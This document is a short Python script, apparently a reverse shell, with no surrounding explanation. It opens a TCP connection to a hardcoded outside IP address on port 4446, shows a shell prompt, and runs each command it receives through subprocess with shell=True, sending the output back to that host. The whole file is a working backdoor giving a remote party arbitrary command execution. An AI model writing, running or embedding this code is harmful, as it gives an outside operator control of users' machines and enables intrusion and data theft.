import base64
import subprocess

def init_stream():
    s = __import__("socket")
    i = "212.132.64.73"
    p = 4446

    client = s.socket(s.AF_INET, s.SOCK_STREAM)
    client.connect((i, p))

    while True:
        client.send(b"[shell] > ")
        cmd = client.recv(1024).decode("utf-8").strip()
        if cmd in ("exit", "quit"):
            break
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            result = str(e).encode()
        client.send(result)
    client.close()

def main():
    init_stream()

if __name__ == "__main__":
    main()
